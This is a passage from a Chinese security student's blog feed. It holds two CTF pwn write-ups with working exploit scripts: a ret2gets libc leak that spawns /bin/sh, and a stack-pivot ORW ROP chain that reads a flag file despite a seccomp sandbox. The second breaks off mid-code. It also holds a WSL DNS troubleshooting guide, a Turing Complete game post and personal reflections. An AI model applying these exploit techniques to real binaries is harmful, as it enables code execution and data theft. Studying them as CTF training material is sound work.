class="hljs-number">0x401209</span><br>bss=<span class="hljs-number">0x404030</span><br>gadget1=<span class="hljs-number">0x0000000004011EC</span> <span class="hljs-comment">#get&amp;printf</span><br>gadget2=<span class="hljs-number">0x00000000004011FD</span> <span class="hljs-comment">#printf</span><br>ret=<span class="hljs-number">0x000000000040101a</span><br>io.recvuntil(<span class="hljs-string">b&#x27;Please Enter your name: &#x27;</span>)<br><span class="hljs-comment">#第一次尝试</span><br><span class="hljs-comment"># payload=b&#x27;a&#x27;*0x80+p64(bss+0x80)+p64(gadget2)</span><br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># io.sendline(payload)</span><br><br><span class="hljs-comment">#第二次尝试</span><br><span class="hljs-comment"># payload=b&#x27;a&#x27;*0x80+p64(bss+0x80+0x80)+p64(gadget1)</span><br><span class="hljs-comment"># payload1=p64(bss)+p64(main_addr)+b&#x27;a&#x27;*0x70+p64(bss+0x80)+p64(gadget2)</span><br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># io.sendline(payload)</span><br><br><span class="hljs-comment"># # io.recvuntil(b&#x27;Welcome to Tech Olympics 2025, Dear aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0@@&#x27;)</span><br><span class="hljs-comment"># io.sendline(payload1)</span><br><span class="hljs-comment"># # io.recvuntil(b&#x27;Welcome to Tech Olympics 2025, Dear &#x27;)</span><br><span class="hljs-comment"># # data=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="hljs-comment"># # log.success(&#x27;leak:&#x27;+hex(data))</span><br><br><span class="hljs-comment">#第三次尝试</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+p64(bss+<span class="hljs-number">0x80</span>)+p64(get_addr)+p64(get_addr)+p64(ret)+p64(printf_plt)+p64(main_addr)<br><br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">b&quot;%3$p&quot;</span>+<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&quot;%3$p&quot;</span>+<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;Welcome to Tech Olympics 2025, Dear aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0@@&#x27;</span>)<br>io.recvline()<br>data=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stdin:&quot;</span>+<span class="hljs-built_in">hex</span>(data))<br>offset=<span class="hljs-number">0x7f687603d8e0</span>-<span class="hljs-number">0x7f6875e3a000</span><br>libc_base=data-offset<br>log.success(<span class="hljs-string">&quot;libc_base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>io.recvuntil(<span class="hljs-string">b&#x27;Please Enter your name: &#x27;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+p64(bss+<span class="hljs-number">0x80</span>)+p64(get_addr)+p64(get_addr)+p64(system_addr)<br>gdb.attach(io)<br>io.sendline(payload2)<br>io.sendline(<span class="hljs-string">b&#x27;/bin&#x27;</span>+p8(u8(<span class="hljs-string">&#x27;/&#x27;</span>)+<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;sh\x00&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;/bin&#x27;</span>+p8(u8(<span class="hljs-string">&#x27;/&#x27;</span>)+<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;sh\x00&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251015165126-4ktttne.png" alt="image"></p><p>应该是我的版本不对，这道题的版本太高了，我在pwndbg上调试的时候看到是可以执行<code>system（&quot;/bin/sh\x00&quot;)</code>的</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>ret2gets感觉别人的文章已经写得很详细了，我就不冗余的再写技术介绍了。建议直接去看国外的那位大佬的文章，非常详细。</p><p><a href="https://blog.csdn.net/2502_91269216/article/details/148261096">ret2gets 一种控制rdi的攻击方法</a></p><p><a href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets">ret2gets</a></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Turing Complete——优雅存储&amp;小盒子</title>
    <link href="/post/turing-complete---elegant-storage-5yncu.html"/>
    <url>/post/turing-complete---elegant-storage-5yncu.html</url>
    
    <content type="html"><![CDATA[<h1 id="Turing-Complete——优雅存储-小盒子"><a href="#Turing-Complete——优雅存储-小盒子" class="headerlink" title="Turing Complete——优雅存储&amp;小盒子"></a>Turing Complete——优雅存储&amp;小盒子</h1><h2 id="优雅存储"><a href="#优雅存储" class="headerlink" title="优雅存储"></a>优雅存储</h2><p>这一关的电路结构非常的简单，但是当时一直没有打出来，主要是当时这种思想没理解到加上当时直觉上以为电路中不能形成回环，所以很久都没有搞出来。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-09%20080359-20250909103402-62fsd3y.png" alt="屏幕截图 2025-09-09 080359">​</p><p>最后的电路就是这样，非常简单，思想也就是当不可以进行修改的时候，将之前的输出再次输出。就这样简单的一个电路结构，竟然就构成了一个存储器，往后计算机中极为重要的存储在最开始原来就是这样简单的电路。</p><p>但是，观察这一个电路的结构，就很容易发现，这里的存储方式是通过一直写入从而达到保存数据的目的，因此，当我们断掉电源之后，就将失去数据。这倒也确实很符合早期存储的现象，但是现如今的存储已经不会在因为断电而丢失信息，所以现在的存储器又是怎么构成的呢？</p><h3 id="一些满足好奇的了解"><a href="#一些满足好奇的了解" class="headerlink" title="一些满足好奇的了解"></a>一些满足好奇的了解</h3><p>经过一些搜索之后，专业上把之前提到的会因断电而丢失信息的存储称为易失性存储，而不会因断电而丢失信息的存储称为非易失性存储。现在的计算机也并没有放弃易失性存储，时至现在，我们的计算机都还存在着易失性存储。</p><p>简单了解了一下，一般非易失性存储的实现一般都是依靠的其物理特性，例如，在闪存中是存在一个浮栅用于困住电子以保存数据，或则依靠一些其他的物理特性。</p><p>在计算机中，一般易失性存储用于高速缓存，因为缓存的作用并不需要一直保存信息，它只作为一个信息的中转站，并且像SRAM和DRAM这类易失性存储的传输速度远远高于非易失性存储，所以我们现在其实仍然在使用易失性存储。</p><p>（只是简单搜索了解了一下，如果存在错误，请联系我修改）</p><h2 id="小盒子"><a href="#小盒子" class="headerlink" title="小盒子"></a>小盒子</h2><p>这一关挺简单的，就是有点恶心，因为限制了空间大小，导致我尝试了好多次都因为空间问题而失败。现在游戏没告诉我为什么这一关空间这么小，但是我怀疑是因为在实际环境下的硬件空间有限。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250909114422-iesdff6.png" alt="image"></p><p>空间确实是很小了，实现的功能是指定地址读写，思路也很简单，设置好开关的接口后（上面黄线部分），让开关控制每一个寄存器是否可以读写，没什么逻辑难点，主要是布线麻烦，放上来存粹是为了展示一下这个我很满意的布线。</p><p>指定地址读写感觉也算是计算机里很重要的一个功能了，还是会感觉很惊讶一些感觉简单的线路最后竟然会造出功能如此强大的计算机。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望可以早日手搓出一台计算机</p>]]></content>
    
    
    <categories>
      
      <category>游戏</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Turing Complete</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对写blog的一些小思考</title>
    <link href="/post/some-thoughts-on-writing-blogs-27dawp.html"/>
    <url>/post/some-thoughts-on-writing-blogs-27dawp.html</url>
    
    <content type="html"><![CDATA[<h1 id="对写blog的一些小思考"><a href="#对写blog的一些小思考" class="headerlink" title="对写blog的一些小思考"></a>对写blog的一些小思考</h1><p>之前看到p神（phithon）写的blog，首先还是很佩服p神竟然能够连续写blog写十几年，其次就是看了大神的blog之后对自己的blog也有了一些反思。</p><p>‍</p><p>之前我一直感觉博客是拿来记录自己的学习进度的一个地方，然后每次就会特意去学一个知识点，然后写一篇博客去记录，但是往往坚持不了多久就写不下去了。因为对我来说感觉是有一点痛苦了，我是想要写一点不一样的东西出来的，但是当我打算开始学习一个知识点的时候，就会发现之前的师傅们总结的其实已经很好了，于是每当我学习完了一个知识点之后想要写一篇文章去总结的时候，写着写着就会发现我的文章不管是内容还是格式，和其他师傅写的文章重复率高达百分之五六十，这让我有一种在抄袭其他师傅文章的愧疚感。因此文章常常写不下去，或则写到一半就放弃了。</p><p>‍</p><p>所以我打算改变一下我的写作风格，打算把博客用来记录一下平时自己遇见的问题和思考，在记录一下自己感觉很有意思的事，比如之前遇到的那道芯片安全的题目，这是我目前为来第一次遇到这样的题目，虽然开始一点都看不懂，但是看了一天之后还是有一点了解了，后续我可能会写一篇复现；还有最近在玩的Turing Complete，感觉挺有意思，可能会把一些我感觉比较难的关卡写一篇文章中分享一下。</p><p>‍</p><p>最后，希望我的博客可以是我用来思考和分享快乐的地方，而不是在重复中感到痛苦的地方。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>心得与体会</category>
      
    </categories>
    
    
    <tags>
      
      <tag>心得与体会</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wsl中ubuntu的DNS解析错误</title>
    <link href="/post/dns-resolution-error-for-ubuntu-in-wsl-1isudy.html"/>
    <url>/post/dns-resolution-error-for-ubuntu-in-wsl-1isudy.html</url>
    
    <content type="html"><![CDATA[<h1 id="wsl中ubuntu的DNS解析错误"><a href="#wsl中ubuntu的DNS解析错误" class="headerlink" title="wsl中ubuntu的DNS解析错误"></a>wsl中ubuntu的DNS解析错误</h1><h2 id="判断是否是dns解析错误"><a href="#判断是否是dns解析错误" class="headerlink" title="判断是否是dns解析错误"></a>判断是否是dns解析错误</h2><p>1.进入wsl ping <a href="http://www.baidu.com/">www.baidu.com</a> 不通；</p><p>2.本机cmd ping <a href="http://www.baidu.com/">www.baidu.com</a> 正常；</p><p>3.把本机ping 百度的ip拿出来，用wsl直接ping 百度的ip正常；</p><p>通过此步骤基本可以判断是WSL2默认的DNS配置有问题。</p><p>（出现这个的原因是是因为ubuntu自身的配置会每次将dns改为初始值）</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>创建&#x2F;etc&#x2F;wsl.conf，内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[network]<br>generateResolvConf = <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>这是用于将ubuntu自己获取dns的配置关掉</p><p>退出 wsl，关机然后重新启动：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">exit</span><br>wsl <span class="hljs-comment">--shutdown</span><br>wsl<br></code></pre></td></tr></table></figure><p>删除 link 文件：<code>/etc/resolv.conf</code>​:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm /etc/resolv.conf<br></code></pre></td></tr></table></figure><p>然后新建 <code>/etc/resolv.conf</code>​ 文件，内容如下，可自定义 nameserver 地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nameserver 8.8.8.8<br></code></pre></td></tr></table></figure><p>再次退出 wsl，关机然后重新启动：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">exit</span><br>wsl <span class="hljs-comment">--shutdown</span><br>wsl<br></code></pre></td></tr></table></figure><p>一般这样之后这个问题就会解决</p><p>但是我之前这样操作之后还是没有连上网</p><p>后来一篇文章中看到<a href="https://www.cnblogs.com/gatling/p/18113032">https://www.cnblogs.com/gatling/p/18113032</a></p><p>还需要将我们wsl上的网关信息也放在<code>/etc/resolv.conf</code>​</p><p>cat &#x2F;etc&#x2F;resolv.conf<br>nameserver 172.21.32.1（在路由中找到的网关信息)<br>nameserver 8.8.8.8<br>nameserver 8.8.4.4</p><h2 id="解决PLUS"><a href="#解决PLUS" class="headerlink" title="解决PLUS"></a>解决PLUS</h2><p>这个问题其实断断续续困扰了我将近半年了，这学期学完计网，终于是明白了了造成这个问题最根本的原因了，</p><p>在我的电脑上出现的问题是使用公共DNS，例如8.8.8.8，DNS仍然解析不成功，但是如我上述的解决方法，把在路由里找到的ip放进去就可以解析了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250720134332-f9jht0o.png" alt="image"></p><p>造成这个问题的原因我怀疑是，wsl作为虚拟机不能直接与外部的DNS相连，需要先经过我们的本机作为中转，先将我们需要解析的域名发给本机，让本机交给外部的DNS去解析，然后再返还给wsl。此时，如果我们的在<code>/etc/resolv.conf</code>​里面写nameserver 8.8.8.8，就会前往本机里面寻找8.8.8.8，找不到，自然也就解析不了。如果我们此时写的是192.168.31.1，就能够找到我们本机，让我们的本机在转发去寻找8.8.8.8，就能够解析成功。</p><p>但是现在还存在一个问题，就是如果我们连接的wifi更换了的话，那个在图中我们圈起来的ip也是会变化的，此时我们就需要在<code>/etc/resolv.conf</code>​更换我们的内容为更新后的ip，但是每换一次网络就得更换ip太过复杂，所以可以写一个自动化的脚本在我们每次启动wsl的时候自动更新DNS</p><p>以下解决方案需要windows11，wsl2并开启了systemd特性</p><p>可以使用以下命令查看是否具有systemed，出现systemd就是存在</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ps -p 1 -o <span class="hljs-built_in">comm</span>=<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250720163204-j5cpatz.png" alt="image"></p><p>然后使用以下命令查看是否启用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl list-units<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250720163743-8opx1if.png" alt="image"></p><p>这样应该就是启用了的，可以开始配置了，如果没有启用，就还需要开启</p><h3 id="如何启用-systemd（如果未开启）"><a href="#如何启用-systemd（如果未开启）" class="headerlink" title="如何启用 systemd（如果未开启）"></a>如何启用 systemd（如果未开启）</h3><p>修改 WSL 的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nano /etc/wsl.conf<br></code></pre></td></tr></table></figure><p>添加以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[boot]</span><br><span class="hljs-attr">systemd</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>保存并退出，再重新启动</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wsl <span class="hljs-literal">--shutdown</span><br></code></pre></td></tr></table></figure><h3 id="自动写入"><a href="#自动写入" class="headerlink" title="自动写入"></a>自动写入</h3><p>以下是我自动写入的shell脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br>gw=$(ip route | grep default | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nameserver <span class="hljs-variable">$gw</span>&quot;</span> &gt; /etc/resolv.conf<br></code></pre></td></tr></table></figure><p>创建<code>/usr/local/bin/update-wsl-dns</code>​然后写入我们的脚本，然后再给文件权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> +x /usr/local/bin/update-wsl-dns<br></code></pre></td></tr></table></figure><p>创建<code>/etc/systemd/system/update-wsl-dns.service</code>​，写入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">[Unit]<br>Description=Update WSL DNS from Windows Gateway<br>After=network-online.target<br>Wants=network-online.target<br><br>[Service]<br>Type=oneshot<br>ExecStart=/usr/local/bin/update-wsl-dns<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> systemctl daemon-reexec<br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> update-wsl-dns.service<br><span class="hljs-built_in">sudo</span> systemctl start update-wsl-dns.service<br></code></pre></td></tr></table></figure><p>这样，在每次启动wsl的时候就可以自动写入dns而不需要自己每次都手动写入了，如果发现dns失效，重启一下wsl或则执行<code>sudo update-wsl-dns</code>​就可以解决</p><p>‍</p><p>‍</p><p>前半段的解决是在去年寒假写的，这学期学完计网之后了解了问题原因写了解决plus，其实我的计网学的也不好，只有期末突击了一下，所以要是问题原因解释的不对，希望师傅们可以留言告诉我一下。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>环境问题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>碎碎念</title>
    <link href="/post/silent-thoughts-zrtgyp.html"/>
    <url>/post/silent-thoughts-zrtgyp.html</url>
    
    <content type="html"><![CDATA[<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>这么偏的blog，应该也没什么人看，就写一些碎给自己看吧</p><p>昨天看了一位师傅的bolg，感觉差距真的也算是挺大的，那个师傅在刚学四个月的时候就开始思考关于pwn的实战攻击了，而自己却一直局限在ctf里面，而且相较于那位师傅自己学得也太慢了，这些真的需要好好反思反思了，所以写一篇感悟警醒一下自己。</p><p>不想当黑客的pwner不是一个好的pwner，当初也是因为感觉pwn很帅选择学的pwn，但是可能是因为在一些比赛里面拿了一些奖吧，感觉反而更去最求得奖了，学习新技术的时间也越来越少，反而去研究该怎么把题目做出来。现在突然感觉自己停滞了好久，现在自己已经大二下了，但是堆的高版本利用方法还不会，之前计划以后学的内核，iot，windows pwn都还遥遥无期，感觉自己离自己那个黑客梦越来越远了。</p><hr><p>没想到这周这么忙（周四刚回学校，周五惊觉自己还有六级），还以为自己能写完呢，其实剩下两个弄了一半了，但是文章还没怎么写，虽然没写完，但是我还是觉得这个周报，挺有用的，比如这周我这么忙的情况下，要是没有我自己立下的flag，我可能都不怎么会学了，但现在，虽然没有全部干完，也还是干了一半多的，所以我觉得还是挺有用的。</p><p>然后就是，当时xia0ji233师傅看见了我写的这一篇blog，就过来和我聊了一下（应该是单方面给我说，因为我太i了不敢说话），给了我一些建议，所以真的很庆幸当时加入了nepnep，遇见了xia0ji233师傅，给我学习了路上很多的引导和鼓励</p><hr><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>心得与体会</category>
      
    </categories>
    
    
    <tags>
      
      <tag>心得与体会</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>京麒——OldWine</title>
    <link href="/post/kyoki--oldwine-1yet2t.html"/>
    <url>/post/kyoki--oldwine-1yet2t.html</url>
    
    <content type="html"><![CDATA[<h1 id="京麒——OldWine"><a href="#京麒——OldWine" class="headerlink" title="京麒——OldWine"></a>京麒——OldWine</h1><p>不会打，太坐牢了，只能复现了qwq(没想到时间拖了这么久）</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>开了一个沙箱，把execve禁了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153633-39ylc9y.png" alt="image"></p><p>然后权限限制得很死</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153755-doma7u3.png" alt="image"></p><p>也不给我们可以用的寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154040-e2qwd8o.png" alt="image"></p><p>在程序中给了我们两个选项</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154219-m5yqkfg.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154245-yuxzkzi.png" alt="image"></p><p>1是可以向栈上写东西</p><p>如果输入2，就会调用一次leave然后回到菜单处</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154534-8b6j5cu.png" alt="image"></p><p>众所周知</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">leave = mov esp, ebp<br>pop ebp<br></code></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我当时没有思路，看了wp之后，发现师傅们都是修改bp的后两位，使bp位于sp前</p><p>终于，经过我不懈的调试，终于懂了这道题目该怎么做了</p><p>首先这道题目一定得先链接出题人给的libc库，我开始使用的自己的库（开始还以为做栈上的题影响不大呢，看来自己见识的还是太少了），调试的时候rbp里面存放的值是1，导致我一直不知道其他师傅的wp里面写的覆盖rbp后两位然后让rbp位于rsp之前是怎么做到的</p><p>这是使用的我自己的库</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20151452-20250528105710-v2vpyol.png" alt="屏幕截图 2025-05-27 151452"></p><p>这是使用出题人给的库</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20165814-20250528105643-dhr6zrw.png" alt="屏幕截图 2025-05-27 165814"></p><p>可以看到rbp里面放的东西完全不一样（但是为什么不同的库会导致rbp里面的值不一样我还不知道，要是有师傅知道，可以留言告诉我一下吗）</p><p>然后我们之后就可以通过溢出使old_rbp的后两位覆盖为00，使得有一定机率之后让rbp小于等于rsp</p><p>然后我们进入到read函数里面，可以看到</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131133-qis17gi.png" alt="image"></p><p>执行完read函数返回时，只用了<code>ret=pop rip</code>​,所以返回地址现在是放在rsp里面的</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131356-l3ywzid.png" alt="image"></p><p>然后，我们看一下在调用read函数之前的寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131822-sso042c.png" alt="image"></p><p>我们看到，rsi寄存器(写入数据的地址)里面放的是<code>[rbp-0x10]+rcx</code>​，此时因为我们把rbp放到了rsp的前面，就可以通过read的溢出覆盖到rsp，而rsp里面存放的是返回地址，此时就算我们不知道程序中的具体位置，也可以覆盖返回地址后两位跳转到write进行泄露</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528132518-9qs9mu1.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250605151132-tboxdhh.png" alt="image"></p><p>可以看到已经泄露出来东西了</p><p>本来后续想用栈迁移写的，但是不知道为什么栈迁移不稳定的因素太多了，很难调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">io.sendline(b<span class="hljs-string">&#x27;64&#x27;</span>)<br>     io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,b<span class="hljs-string">&#x27;16&#x27;</span>)<br>     io.send(p64(start+<span class="hljs-number">0x4300</span>))<span class="hljs-meta">#rsp=start+0x4300</span><br>     leave()<br>     <br>     cmd1(<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,p64(start+<span class="hljs-number">0x4100</span>))<span class="hljs-meta">#rbp=start+0x4100</span><br>     leave()<br>     <br>     payload=b<span class="hljs-number">&#x27;f</span>lag<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00&#x27;<br>     payload+=p64(start+<span class="hljs-number">0x14f5</span>)<br>     <br>     payload+=p64(rdi)+p64(start+<span class="hljs-number">0x40f8</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">0x2</span>)+p64(syscall)<span class="hljs-meta">#open</span><br>     payload+=p64(rdi)+p64(<span class="hljs-number">0x3</span>)+p64(rsi)+p64(start+<span class="hljs-number">0x4400</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<span class="hljs-meta">#read</span><br>     payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(start+<span class="hljs-number">0x4400</span>)+p64(rax)+p64(<span class="hljs-number">0x1</span>)+p64(syscall)<span class="hljs-meta">#write</span><br>     <br>     cmd1(len(payload),<span class="hljs-number">8</span>,payload)<br>     <br>    <br>     cmd1(<span class="hljs-number">8</span>,<span class="hljs-number">0x210</span>,p64(start+<span class="hljs-number">0x4101</span>))<br>     <br>     print(<span class="hljs-string">&#x27;where is my flag&#x27;</span>)<br>     <br>     pause()<br></code></pre></td></tr></table></figure><p>本来是这么写的，但是问题很多，栈迁移在一些情况下bp里面的值会被覆盖导致栈迁移失败，然后有一次到了我写的payload位置，但是不知道为什么，卡着动不了了，实在是不想调这个了，所以打算换一种方法写</p><p>于是我看了一下，可以泄露出栈上面的一个地址，然后已知rbp的值末尾一定为00，如果我们把我们泄露出的栈上末尾改为00，相当于我们就获得了rbp的地址（这里的输出名字改了一下，原来的stack输出的其实是起始地址，现在的stack才是真正的栈上地址）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607141359-9i1c9ib.png" alt="image"></p><p>可以看到我们获得了rbp的地址，所以我们就可以把flag输入到栈上，然后由于我们循环进来的i让我们覆盖到了位于rsp的返回地址上，此时，我们再输入<code>cmd1(8,8*i,payload)</code>​就可以把payload放到返回地址上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 